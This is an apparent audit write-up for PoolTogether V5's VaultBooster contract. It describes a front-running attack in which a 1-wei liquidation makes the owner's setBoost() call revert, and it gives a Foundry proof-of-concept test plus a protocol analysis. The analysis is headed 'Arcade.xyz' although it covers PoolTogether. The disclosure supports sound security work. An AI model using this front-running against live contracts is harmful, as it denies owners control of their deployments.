
# 🟡 An attacker can preemptively block the configuration of boost values or the liquidation pair in `VaultBooster` through front-running
##Lines of code
- https://github.com/GenerationSoftware/pt-v5-vault-boost/blob/9d640051ab61a0fdbcc9500814b7f8242db9aec2/src/VaultBooster.sol#L142-L165
- https://github.com/GenerationSoftware/pt-v5-vault-boost/blob/9d640051ab61a0fdbcc9500814b7f8242db9aec2/src/VaultBooster.sol#L211-L237
## Impact
- This issue is related to the `setBoost()` function in `VaultBooster`, which allows the owner to configure boost parameters for a specific token (`tokenOut`).
- The function includes a check on `_initialAvailable` to ensure it does not exceed the contract's balance.
```solidity
if (_initialAvailable > 0) {
      uint256 balance = _token.balanceOf(address(this));
      if (balance < _initialAvailable) {
        revert InitialAvailableExceedsBalance(_initialAvailable, balance);
}
```
- However, an attacker can front-run the owner's transaction and call `liquidate()` through the Liquidation Pair contract, reducing the contract's balance. As a result, the owner's transaction will revert, preventing the update of the liquidation pair and other boost parameters.
- To initiate this attack, the attacker does not need a large amount of tokens. Even a liquidation amount as small as `1 wei` is sufficient to prevent the owner from configuring the boost parameters for as long as needed. This allows the attacker to maintain control and hinder the owner's ability to update the boost settings.
- The inability to change the values such as `_multiplierOfTotalSupplyPerSecond` and `_tokensPerSecond` when needed could lead to suboptimal boost strategies, inefficiencies, and missed opportunities for the associated prize vault. Flexibility in adjusting these parameters is crucial for adapting to changing market conditions and maintaining competitiveness in the dynamic DeFi ecosystem.

## Proof of Concept
Assembling this PoC will take a little work as the standard tests used only mock addresses instead of actual contracts.

- Create a folder  `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC`
- Add the following code to `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC/MockERC20.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "openzeppelin/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
  constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {}

  function mint(address to, uint256 amount) public {
    _mint(to, amount);
  }
}
```
- Copy `/2023-08-pooltogether/pt-v5-cgda-liquidator/src/libraries/ContinuousGDA.sol` to `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC/ContinuousGDA.sol`
- Copy `/2023-08-pooltogether/pt-v5-cgda-liquidator/src/LiquidationPair.sol` to `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC/LiquidationPair.sol`
- Edit the import of ContinuosGDA at line 8 in `LiquidationPair.sol` as follows:
```solidity
import { ContinuousGDA } from "./ContinuousGDA.sol";
```
- Add the following code to `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC/PoC.t.sol`
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./MockERC20.sol";
import "./LiquidationPair.sol";

import { SD1x18, unwrap, UNIT, sd1x18 } from "prb-math/SD1x18.sol";
import { UD2x18, ud2x18 } from "prb-math/UD2x18.sol";

import { VaultBooster, Boost, UD60x18, UD2x18, InitialAvailableExceedsBalance, OnlyLiquidationPair, UnsupportedTokenIn, InsufficientAvailableBalance } from "../../src/VaultBooster.sol";
import { PrizePool, TwabController, ConstructorParams, IERC20 } from "pt-v5-prize-pool/PrizePool.sol";

contract PoC is Test {

  // Tons of params required to setup the whole PoolTogether system

  ConstructorParams params;
  VaultBooster booster;
  LiquidationPair liquidationPair;
  ILiquidationSource source;
  TwabController twabController;
  PrizePool prizePool;
  MockERC20 boostToken;
  MockERC20 prizeToken;

  address vault;
  SD59x18 decayConstant = wrap(0.001e18);
  uint32 periodLength = 1 days;
  uint32 periodOffset = 1 days;
  uint32 targetFirstSaleTime = 12 hours;
  uint112 initialAmountIn = 1e18;
  uint112 initialAmountOut = 1e18;
  uint256 minimumAuctionAmount = 0;
  uint32 drawPeriodSeconds = 1 days;
  uint64 lastClosedDrawStartedAt = uint64(block.timestamp + 1 days);
  uint8 initialNumberOfTiers = 3;
  address drawManager = address(this);

  function setUp() public {
    //TokenIn
    prizeToken = new MockERC20("PrizeToken", "PT");

    //TokenOut
    boostToken = new MockERC20("BoostToken", "BT");

    //TwabController
    twabController = new TwabController(drawPeriodSeconds, uint32(block.timestamp));

    //Prize Vault
    vault = makeAddr("vault");

    //Prize Pool
    params = ConstructorParams(
      IERC20(address(prizeToken)),
      twabController,
      drawManager,
      drawPeriodSeconds,
      lastClosedDrawStartedAt,
      initialNumberOfTiers,
      100,
      10,
      10,
      ud2x18(0.9e18),
      sd1x18(0.9e18)
    );
    prizePool = new PrizePool(params);

    //Vault Booster
    booster = new VaultBooster(prizePool, vault, address(this));

    //Liquidation Pair
    source = ILiquidationSource(address(booster));
    liquidationPair = new LiquidationPair(
      source,
      address(prizeToken),
      address(boostToken),
      periodLength,
      periodOffset,
      targetFirstSaleTime,
      decayConstant,
      initialAmountIn,
      initialAmountIn,
      minimumAuctionAmount
    );
  }

  function testFrontRun() public {
    vm.warp(0);

    //Minting 1e18 Boost Tokens to the Booster
    boostToken.mint(address(booster), 1e18);

    //Setting up the Booster to allow liquidation for Boost Token
    booster.setBoost(boostToken, address(liquidationPair), UD2x18.wrap(0.001e18), 0.03e18, 1e18);

    //Ensuring VaultBooster is properly configured
    Boost memory boost = booster.getBoost(boostToken);
    assertEq(boost.available, 1e18);

    vm.warp(10);

    //Now the Vault Booster's owner decides to update the boost values by calling `setBoost`
    //But attacker front-runs it by doing the following two steps in a single transaction

    //1. Attacker sends 100 wei Prize Tokens to Prize Pool
    prizeToken.mint(address(prizePool), 100);
    //2. Attacker calls the liquidation Pair to liquidate 100 wei of Boost Tokens for 100 wei of Prize Tokens in Vault Booster
    vm.prank(address(liquidationPair));
    booster.liquidate(address(this), address(prizeToken), 100, address(boostToken), 100);

    //The transcation to update the boost will revert as `_initialAvailable < balance` due to liquidation of tokens
    vm.expectRevert();
    booster.setBoost(boostToken, address(liquidationPair), UD2x18.wrap(0.002e18), 0.03e18, 1e18);
  }
}
```
- Run the following command in `/2023-08-pooltogether/pt-v5-vault-boost/`:
```bash
forge test --mc "PoC" -vvvv
```
## Tools Used
Manual Review

## Recommended Mitigation Steps
- The most appropriate mitigation seems to add a pausing functionality on liquidations to allow Vault Booster's owners to update the boost values.

# 🔍 Analysis Report for Arcade.xyz

## Codebase quality
The overall quality of the codebase for PoolTogether can be classified as "*Good*".

**Strengths**
- Natspec was really helpful and detailed.
- It tries to achieve complete decentraliztion. It’s remarkable they can do this without any governance.

**Weaknesses**
- Majority of the tests were using mock addresses instead of actual contracts. This is not recommended.
- Almost zero documentation for 50% of the contracts in-scope.

## Mechanism Review

- PoolTogether is a decentralized finance protocol that combines savings and lottery, allowing users to deposit funds and have a chance to win rewards in daily prize draws, while maintaining the ability to withdraw their initial deposits at any time.
- Following are the major parts of Pooltogether system:
    - **Prize Pool (OOS):** The Prize Pool receives POOL tokens from Vaults, and releases the tokens as prizes in daily Draws.
    - **Prize Vaults (or Vaults) (OOS):** Users deposit tokens into Vaults in order to be eligible to win prizes. Vaults generate yield, liquidate the yield for POOL tokens, and contribute the POOL to the Prize Pool. The amount of contributed POOL determines the Vault's portion of the odds.
    - **TwabController (OOS)**: A system that keeps track of users token balances, their historic balances and their average balances of historic time periods.
    - **Prize Claimer (OOS)**: Instead of users claiming their prize, the system incentivizes bots to claim the user’s prizes for them.
    - ****Draw Auction:**** A system that leverages an incentivisation mechanism to encourage competition among third parties to complete the draws in a timely manner while maximizing cost efficiency.
    - **Vault Boosters**: Allows to boost a vault winning chance by providing more liquidity to be exchanged for Pool Tokens.
    - **Liquidation Router:** End-users (liquidators) use this contract to swap vault shares or ERC20 tokens (like USDC) for POOL Tokens from the Vault or Vault Boosters. More sophisticated liquidators can directly call the Liquidation Pair.
    - **Liquidation Pair**: The call of Liquidation Router goes through a liquidation pair. It calculates how much amount should be swapped for the provided tokens. Vaults only accept call from their assigned liquidation pair to liquidate the tokens/shares.
- **Deposit & Withdrawal Flow**
    ![https://res.cloudinary.com/duqxx6dlj/image/upload/v1691410971/Pooltogether/1_qscfy0.jpg](https://res.cloudinary.com/duqxx6dlj/image/upload/v1691410971/Pooltogether/1_qscfy0.jpg)
    
    - You have `1000 USDC`. You deposit that into the Pooltogether’s USDC Prize Vault .
    - This vault sends the USDC amount to a yield vault (e.g. AAVE) and in-turn recieves yield vault’s shares. Then the prize vault will mint shares to the user.
    - All of this happens in the same transaction.
    - The withdrawal process is vice-versa.
    - So, multiple users deposit their USDC into the prize vault which is then deposited into yield vault. This vault recieves yield generated from the Yield Vault. This yield is auctioned off for POOL tokens which are deposited in Prize Pool to increase the vault’s chances of winning.
    - ***Note**: Minting and burning of shares of all vaults happen through a singleton contract - `TWABController`. It is omitted for simplicity.*
- **Liquidation Flow**
    ![https://res.cloudinary.com/duqxx6dlj/image/upload/v1691410971/Pooltogether/2_abf87b.jpg](https://res.cloudinary.com/duqxx6dlj/image/upload/v1691410971/Pooltogether/2_abf87b.jpg)
    
    - When a liquidator initiates the liquidation process, they call `swapExactAmountOut` on the LiquidationRouter. The router then transfers the POOL tokens from the liquidator and to the Prize Pool on behalf of the vault. The router also checks that the liquidation pair beinng called is deployed by the liquidation factory.
    - It then calls the `swapExactAmountOut` on Liquidation Pair associated with the vault. In the LiquidationPair, there are two tokens involved:
        - `tokenIn`  : POOL token
        - `tokenOut` : Vault shares
        
        The liquidation pair then calls `liquidate` on the Vault. 
        
    - The vault then calls `contributePrizeTokens` on the PrizePool to register the vault’s contribution. Then, it mints the vault shares to the liquidator.
    - ***Note**: The liquidation pair uses Continuous Gradual Dutch Auction system to sell the vault shares or ERC20 tokens (in case of Vault Boosters).*
- **Vault Boosters**
    ![https://res.cloudinary.com/duqxx6dlj/image/upload/v1691410971/Pooltogether/3_gblrty.jpg](https://res.cloudinary.com/duqxx6dlj/image/upload/v1691410971/Pooltogether/3_gblrty.jpg)
    
    - A prize vault can increase its chances of winning by using a Vault Booster.
    - Here's how it works: When a vault is created, a corresponding Vault Booster is deployed and linked to the vault's address (set in the constructor). The owner of the Vault Booster sets up corresponding Liquidation Pair for all the supported tokens.
    - Liquidators can then use the `swapExactAmountOut` function on the LiquidationRouter, providing the address of the Vault Booster's liquidation pair.
    - In this case, instead of receiving vault shares, the liquidator will receive ERC20 tokens, such as USDC or WETH. Additionally, the router will transfer POOL tokens from the liquidator to the Prize Pool as a contribution for the vault.
    - Hence, with the help of vault boosters, a vault can improve its odds of winning by offering additional ERC20 tokens to liquidators in return for Pool Tokens.

## Centralization risks
- The protocol has made significant progress towards decentralization from V4 to V5, and the efforts to achieve this are commendable.
- Regarding the auctions used to obtain a random number from a third party for the draw, it is crucial to carefully assess this aspect. There might be a centralization risk if the third party wins the auction and attempts to manipulate the Prize Pool draws by providing a non-random number.

## Systemic Risks
- Chainlink VRF is critical for fair prize draws. Any issues or unavailability with Chainlink VRF could impact the integrity of the draws.
- Like any smart contract-based system, PoolTogether is exposed to potential coding bugs or vulnerabilities. Exploiting these issues could result in the loss of funds or manipulation of the protocol.
- The continuous gradual Dutch auction (CGDA) mechanism is sensitive to market dynamics and potential manipulation. Fluctuations in token prices and the CGDA can influence prize distributions and introduce economic uncertainties.

## Architecture Recommendations
- I recommend rewriting the tests in the codebase for this audit to use the actual contracts instead of mock addresses. This will offer greater confidence during system deployment.
- Unfortunately, due to time constraints, I was unable to do so and preparing the PoC took longer because the tests lacked actual contracts. Since most of the PoolTogether system (PrizePool, TwabController, etc.) is out-of-scope, it was challenging to create a comprehensive integration test.

## Approach
- During this audit, my main focus was on examining the Liquidation system and the Vault Boosters in the Pooltogether V5 protocol.
- **Day 1:** I spent time understanding the overall working of the Pooltogether V5 system and getting an overview of the codebase.
- **Day 2:** I conducted a detailed exploration of the Liquidation and Vault Booster mechanisms.
- **Day 3:** I identified potential attack vectors and edge cases in the Liquidation flow and Vault Boosters. I also created PoC to demonstrate the issue found.
- **Day 4:** I dedicated this day to preparing the final report and analysis, summarizing the findings and recommendations.

## Learnings
- PoolTogether is a unique protocol that was new to me during this audit. It introduced me to the concept of a prize savings account, where users can securely deposit their funds and have the opportunity to win rewards in return.
- To be honest, PoolTogether is a fascinating protocol that stands out due to its innovative approach in both daily prize draws and the underlying continuous gradual Dutch auction math and the RNG system. The combination of these features makes it an exciting and captivating platform for users and participants in the DeFi ecosystem.
